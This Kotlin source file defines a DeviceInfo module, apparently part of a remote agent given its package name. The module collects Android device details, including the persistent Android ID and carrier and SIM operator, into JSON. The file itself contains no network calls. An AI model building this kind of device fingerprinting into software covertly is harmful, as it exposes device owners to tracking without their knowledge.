package com.starkiller.agent.modules

import android.content.Context
import android.os.Build
import android.provider.Settings
import android.telephony.TelephonyManager
import org.json.JSONObject

class DeviceInfo(private val context: Context) {

    fun collect(): JSONObject {
        val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
        return JSONObject().apply {
            put("manufacturer", Build.MANUFACTURER)
            put("model", Build.MODEL)
            put("device", Build.DEVICE)
            put("product", Build.PRODUCT)
            put("android_version", Build.VERSION.RELEASE)
            put("sdk_int", Build.VERSION.SDK_INT)
            put("build_id", Build.ID)
            put("hardware", Build.HARDWARE)
            put("board", Build.BOARD)
            put("android_id", Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID))
            put("carrier", tm?.networkOperatorName ?: "unknown")
            put("sim_operator", tm?.simOperatorName ?: "unknown")
            put("phone_type", tm?.phoneType ?: -1)
        }
    }
}
